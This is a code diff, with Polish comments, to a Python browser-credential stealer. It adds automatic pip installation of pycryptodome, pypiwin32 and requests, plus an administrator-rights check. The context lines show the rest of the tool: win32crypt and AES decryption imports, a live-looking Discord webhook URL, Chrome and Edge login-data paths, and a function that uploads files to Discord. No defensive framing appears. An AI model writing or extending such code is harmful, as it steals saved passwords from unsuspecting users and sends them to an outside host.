@@ -7,6 +7,20 @@ import base64
 from Cryptodome.Cipher import AES
 import win32crypt
 import sqlite3
+import subprocess
+import sys
+
+# Funkcja instalująca brakujące moduły
+def install_missing_modules():
+    try:
+        required_modules = ["pycryptodome", "pypiwin32", "requests"]
+        for module in required_modules:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", module])
+    except Exception as e:
+        print(f"Błąd podczas instalacji modułów: {e}")
+        sys.exit(1)
+
+install_missing_modules()
 
 # URL webhooka Discorda
 webhook_url = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDUxDtK2bFQXPpRx5G_jGHjy2cNJ-k7_4O4kUAIfJaIZLOTz2JUSLon5QBOGe"
@@ -24,6 +38,11 @@ login_data_paths = {
     "Google Chrome": r"AppData\\Local\\Google\\Chrome\\User Data\\Default",
     "Microsoft Edge": r"AppData\\Local\\Microsoft\\Edge\\User Data\\Default"
 }
+
+# Funkcja do sprawdzania uprawnień
+if not os.access(users_directory, os.W_OK):
+    print("Brak wymaganych uprawnień. Uruchom skrypt jako administrator.")
+    sys.exit(1)
 
 # Funkcja do wysyłania pliku na Discord
 def send_file_to_discord(file_path, webhook_url):
